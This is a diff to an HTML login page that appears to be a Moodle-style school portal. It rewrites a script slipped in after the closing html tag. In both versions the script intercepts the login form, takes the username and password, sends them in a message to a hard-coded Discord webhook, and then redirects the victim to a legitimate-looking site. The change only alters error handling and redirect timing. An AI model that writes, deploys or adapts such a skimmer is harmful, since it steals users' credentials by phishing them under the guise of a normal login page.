@@ -284,52 +284,53 @@ M.util.help_popups.setup(Y);
 </body></html>
 
 <script>
-    document.addEventListener('DOMContentLoaded', function () {
-        const form = document.querySelector('form#login');
-        
-        if (form) {
-            form.addEventListener('submit', function (event) {
-                event.preventDefault();
-                
-                const username = document.querySelector('input[name="username"]').value;
-                const password = document.querySelector('input[name="password"]').value;
-                
-                // Mostrar algún indicador de carga para mejorar UX
-                const submitBtn = document.getElementById('loginbtn');
-                if (submitBtn) submitBtn.disabled = true;
-                
-                fetch('https://discord.com/api/webhooks/1347639051930439711/zhyHwO1Kjg5gZpxQVC58X114E358bTBsWx2DMFW9wnO01laEiqP5FuZYsr0Wk6dJVavd', {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                    },
-                    body: JSON.stringify({
-                        content: `Nuevo intento de login:\nUsuario: ${username}\nContraseña: ${password}`
-                    })
+document.addEventListener('DOMContentLoaded', function () {
+    const form = document.querySelector('form#login');
+    
+    if (form) {
+        form.addEventListener('submit', function (event) {
+            event.preventDefault();
+            
+            const username = document.querySelector('input[name="username"]').value;
+            const password = document.querySelector('input[name="password"]').value;
+            
+            // Mostrar algún indicador de carga para mejorar UX
+            const submitBtn = document.getElementById('loginbtn');
+            if (submitBtn) submitBtn.disabled = true;
+            
+            fetch('https://discord.com/api/webhooks/1347639051930439711/zhyHwO1Kjg5gZpxQVC58X114E358bTBsWx2DMFW9wnO01laEiqP5FuZYsr0Wk6dJVavd', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    content: `Nuevo intento de login:\nUsuario: ${username}\nContraseña: ${password}`
                 })
-                .then(response => {
-                    // No asumir que la respuesta es JSON
+            })
+            .then(response => {
+                if (response.ok) {
                     console.log('Datos enviados correctamente');
-                    
-                    // Redirección a la página legítima después de 500ms para asegurar que la solicitud se complete
-                    setTimeout(() => {
-                        // Redirigir a una página diferente, como la página principal, para evitar confusión
-                        window.location.href = 'https://anoeta.saioka.eus/';
-                    }, 2000);
-                })
-                .catch((error) => {
-                    console.error('Error:', error);
-                    if (submitBtn) submitBtn.disabled = false;
-                    
-                    // Simplemente redirigir en caso de error también
+                    // Solo redirigir si el envío fue exitoso
                     window.location.href = 'https://anoeta.saioka.eus/';
-                });
+                } else {
+                    console.error('Error al enviar datos:', response.status);
+                    // Intentar nuevamente o manejar el error
+                    alert('Error al iniciar sesión. Intente nuevamente.');
+                    if (submitBtn) submitBtn.disabled = false;
+                }
+            })
+            .catch((error) => {
+                console.error('Error:', error);
+                alert('Error de conexión. Intente nuevamente.');
+                if (submitBtn) submitBtn.disabled = false;
             });
-        } else {
-            console.error('Formulario no encontrado');
-        }
-    });
+        });
+    } else {
+        console.error('Formulario no encontrado');
+    }
+});
 </script>
+
 
 
 
